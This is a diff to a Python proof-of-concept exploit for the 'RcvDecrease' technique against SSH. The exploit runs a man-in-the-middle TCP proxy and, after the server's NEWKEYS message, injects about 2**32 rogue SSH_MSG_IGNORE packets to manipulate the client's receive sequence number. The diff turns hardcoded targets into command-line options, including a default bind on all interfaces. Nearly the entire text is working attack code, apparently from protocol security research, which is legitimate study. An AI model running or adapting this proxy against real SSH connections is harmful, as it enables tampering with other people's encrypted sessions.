@@ -1,7 +1,10 @@
 #!/usr/bin/python3
 from binascii import unhexlify
-from common import contains_newkeys, run_tcp_mitm
+
+import click
 from tqdm import trange
+
+from common import contains_newkeys, run_tcp_mitm
 
 #####################################################################################
 ## Proof of Concept for the RcvDecrease technique                                  ##
@@ -17,26 +20,27 @@ from tqdm import trange
 ## Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0    ##
 #####################################################################################
 
-# IP and port for the TCP proxy to bind to
-PROXY_IP = '127.0.0.1'
-PROXY_PORT = 2222
-
-# IP and port of the server
-SERVER_IP = '127.0.0.1'
-SERVER_PORT = 22
-
-# C.Rcv will be decreased by N
-N = 1
-
 rogue_msg_ignore = unhexlify('0000000C060200000000000000000000')
-def inject_rcvdecrease(in_socket, out_socket):
+
+@click.command()
+@click.option("--proxy-ip", default="0.0.0.0", help="The interface address to bind the TCP proxy to.")
+@click.option("--proxy-port", default=22, help="The port to bind the TCP proxy to.")
+@click.option("--server-ip", help="The IP address where the SSH server is running.")
+@click.option("--server-port", default=22, help="The port where the SSH server is running.")
+@click.option("-N", "--decrease-by", default=1, help="The number by which C.Rcv will be decreased.")
+def cli(proxy_ip, proxy_port, server_ip, server_port, decrease_by):
+    print("--- Proof of Concept for RcvDecrease technique ---")
+    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.")
+    run_tcp_mitm(proxy_ip, proxy_port, server_ip, server_port, forward_server_to_client=lambda in_socket, out_socket: inject_rcvdecrease(in_socket, out_socket, decrease_by))
+
+def inject_rcvdecrease(in_socket, out_socket, decrease_by):
     try:
         while True:
             data = in_socket.recv(4096)
             if contains_newkeys(data):
                 print("[+] SSH_MSG_NEWKEYS sent by server identified!")
-                print(f"[+] Injecting 2**32 - {N} SSH_MSG_IGNORE messages to decrease C.Rcv by {N}!")
-                for _ in trange(2**32 - N):
+                print(f"[+] Injecting 2**32 - {decrease_by} SSH_MSG_IGNORE messages to decrease C.Rcv by {decrease_by}!")
+                for _ in trange(2**32 - decrease_by):
                     out_socket.send(rogue_msg_ignore)
             if len(data) == 0:
                 break
@@ -49,6 +53,5 @@ def inject_rcvdecrease(in_socket, out_socket):
     out_socket.close()
 
 if __name__ == '__main__':
-    print("--- Proof of Concept for RcvDecrease technique ---")
-    print("[+] WARNING: Connection failure will occur, this is expected as sequence numbers will not match.")
-    run_tcp_mitm(PROXY_IP, PROXY_PORT, SERVER_IP, SERVER_PORT, forward_server_to_client=inject_rcvdecrease)
+    cli()
+
